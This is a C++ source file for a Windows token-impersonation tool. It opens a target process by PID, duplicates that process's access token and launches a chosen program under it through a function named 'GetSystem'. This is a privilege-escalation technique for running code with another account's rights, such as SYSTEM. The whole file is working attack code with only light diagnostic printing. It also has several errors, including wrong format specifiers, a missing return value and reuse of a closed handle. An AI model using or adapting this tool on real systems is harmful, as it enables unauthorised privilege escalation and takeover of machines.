#include <iostream>
#include <Windows.h>
#include <tchar.h>


HANDLE GetToken(DWORD pid)
{
	HANDLE f = OpenProcess(MAXIMUM_ALLOWED, NULL, pid);
	if (!f)
	{
		wprintf(L"Unable to get process %s\n", GetLastError());
		return FALSE;
	}

	HANDLE process_token;

	if (!OpenProcessToken(f, MAXIMUM_ALLOWED, &process_token))
	{
		wprintf(L"Unable to get token %s\n", GetLastError());
		return FALSE;
	}
	return process_token;
}

BOOL GetTokenInfo(HANDLE process_token)
{
	TOKEN_ELEVATION token;
	DWORD dwsize;

	if (!GetTokenInformation(process_token, TokenElevation, &token, sizeof(token), &dwsize))
	{
		wprintf(L"Unable to get token infomation %s\n", GetLastError());
		CloseHandle(process_token);
	}

	if (!dwsize)
	{
		wprintf(L"Unable to get data %s\n", GetLastError());
		CloseHandle(process_token);
	}

	if (token.TokenIsElevated == NULL)
	{
		wprintf(L"[*] Token is not Elevated\n");
	}
	else
	{
		wprintf(L"[*] Token is Elevated\n");
	}

	// Check token type
	wprintf(L"[*] Token is %s\n", IsTokenRestricted(process_token) ? L"restricted" : L"unrestricted");

	DWORD size;
	TOKEN_TYPE type;
	if (!GetTokenInformation(process_token, TokenType, &type, sizeof(TokenType), &size))
	{
		wprintf(L"Unable to get token type %s\n", GetLastError());
		CloseHandle(process_token);
	}

	if (type == TokenPrimary)
	{
		wprintf(L"[*] Token is Primary\n");
	}
	else
	{
		wprintf(L"[*] Token is Impersonation\n");
	}

	return TRUE;
}

HANDLE PrimaryToImpersonation(HANDLE process_token)
{
	HANDLE new_token;

	if (!DuplicateTokenEx(process_token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &new_token))
	{
		DWORD LastError = GetLastError();
		wprintf(L"ERROR: Could not duplicate process token [%d]\n", LastError);
		return FALSE;
	}
	return new_token;
}

HANDLE ImpersonationToPrimary(HANDLE process_token)
{
	HANDLE new_token;

	if (!DuplicateTokenEx(process_token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &new_token))
	{
		DWORD LastError = GetLastError();
		wprintf(L"ERROR: Could not duplicate process token [%d]\n", LastError);
		return FALSE;
	}
	return new_token;
}

BOOL GetSystem(HANDLE process_token, LPCWSTR bin_to_exec)
{
	STARTUPINFO start_info = {};
	PROCESS_INFORMATION process_info = {};
	BOOL ret;

	ret = CreateProcessWithTokenW(process_token, LOGON_NETCREDENTIALS_ONLY, bin_to_exec, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &start_info, &process_info);
	if (!ret)
	{
		DWORD lastError;
		lastError = GetLastError();
		wprintf(L"CreateProcessWithTokenW: %s\n", lastError);
		return 1;
	}
}


BOOL GetTokenOwner(HANDLE process_token)
{
	DWORD dwsize;
	if (!GetTokenInformation(process_token, TokenOwner, NULL, 0, &dwsize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
	{
		wprintf(L"unable to get buffer size of token owner\n");
		CloseHandle(process_token);
	}

	PTOKEN_OWNER token = (PTOKEN_OWNER)GlobalAlloc(GPTR, dwsize);

	if (!GetTokenInformation(process_token, TokenOwner, token, dwsize, &dwsize))
	{
		wprintf(L"unable to get buffer size of token owner\n");
		CloseHandle(process_token);
		GlobalFree(token);
		return FALSE;
	}

	char nameUser[256] = { 0 };
	char domainName[256] = { 0 };
	DWORD nameUserLen = 256;
	DWORD domainNameLen = 256;
	SID_NAME_USE snu;

	if (!LookupAccountSidA(NULL, token->Owner, nameUser, &nameUserLen, domainName, &domainNameLen, &snu))
	{
		wprintf(L"unable to lookup account sid\n");
		CloseHandle(process_token);
		GlobalFree(token);
		return FALSE;
	}

	std::cout << "[*] Token Owner is " << domainName << '/' << nameUser << std::endl;
	CloseHandle(process_token);
	GlobalFree(token);
	return TRUE;
}

int wmain(int argc, WCHAR** argv)
{
	if (argc < 3)
	{
		wprintf(L"Usage: %ls <PID> <BIN_TO_EXEC>\n", argv[0]);
		return 1;
	}

	DWORD pid = _wtoi(argv[1]);
	HANDLE process_token = GetToken(pid);
	GetTokenInfo(process_token);
	HANDLE duplicate_token = PrimaryToImpersonation(process_token);
	GetSystem(duplicate_token, (LPCWSTR)argv[2]);
	GetTokenOwner(process_token);
}